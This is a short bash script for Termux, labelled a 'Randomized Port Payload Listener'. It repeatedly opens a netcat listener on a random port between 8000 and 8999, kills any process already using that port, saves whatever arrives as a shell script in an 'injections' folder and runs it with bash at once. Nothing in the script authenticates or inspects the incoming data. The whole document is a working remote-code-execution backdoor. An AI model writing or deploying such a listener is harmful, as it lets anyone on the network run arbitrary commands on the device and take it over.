#!/usr/bin/env bash
# LANIMORPH :: Randomized Port Payload Listener (Termux-safe)

SAVE_DIR="$HOME/LANIMORPH/injections"
mkdir -p "$SAVE_DIR"

while true; do
  PORT=$((RANDOM % 1000 + 8000))  # random port between 8000-8999

  if fuser -n tcp $PORT 2>/dev/null | grep -q .; then
    fuser -k -n tcp $PORT 2>/dev/null
    sleep 0.2
  fi

  echo "[🔌] Listening on randomized port: $PORT"
  echo "[~] Waiting for payload..."

  nc -lk -p $PORT > "$SAVE_DIR/recv_$(date +%s).sh" && {
    PAYLOAD=$(ls -t "$SAVE_DIR" | head -n1)
    echo "[✓] Payload received → $SAVE_DIR/$PAYLOAD"
    echo "[>] Executing payload..."
    bash "$SAVE_DIR/$PAYLOAD"
    echo "[✓] Execution complete. Rotating port..."
    echo "---------------------------------------------"
  }

  sleep 1
done
